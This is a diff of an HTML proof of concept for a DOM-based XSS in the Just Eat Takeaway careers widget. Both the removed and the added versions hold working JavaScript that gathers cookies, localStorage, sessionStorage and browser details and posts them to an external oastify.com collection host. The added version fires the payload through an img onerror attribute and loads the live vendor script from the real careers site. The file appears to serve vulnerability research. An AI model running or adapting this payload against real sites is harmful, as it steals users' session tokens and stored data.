@@ -1,40 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>XSS PoC</title>
+  <title>🔥 Just Eat Widget XSS PoC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { display: none; }
-  </style>
 </head>
 <body>
-<script>
-(async () => {
-  try {
-    const j = JSON.stringify;
-    const data = {
-      cookie: document.cookie,
-      localStorage: j(localStorage),
-      sessionStorage: j(sessionStorage),
-      location: location.href,
-      origin: location.origin,
-      referrer: document.referrer,
-      userAgent: navigator.userAgent,
-      domain: document.domain,
-      time: new Date().toISOString()
-    };
+<h2>🔥 DOM XSS in Just Eat Careers Widget</h2>
 
-    await fetch('https://zdg7iqfi8xtdvytlio6z63m5fwlp9fx4.oastify.com', {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'text/plain' },
-      body: j(data)
-    });
-  } catch(e) {
-    // silently fail to avoid breaking any flow
-  }
-})();
+<!-- Trigger the vulnerable widget -->
+<div class="ph-widget" as-element="exploitWidget">
+  <img src=x onerror="
+    (() => {
+      const data = {
+        cookie: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        url: location.href,
+        origin: location.origin,
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        time: new Date().toISOString()
+      };
+      fetch('https://nkbvpem6fl012m09pcdndrttmksdg44t.oastify.com', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain' },
+        body: JSON.stringify(data)
+      });
+    })();
+  ">
+</div>
+
+<!-- Load vulnerable Phenom script -->
+<script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
+<script>
+  // Trigger parsing of widget
+  if (window.PhEnhancer) PhEnhancer();
 </script>
 </body>
 </html>
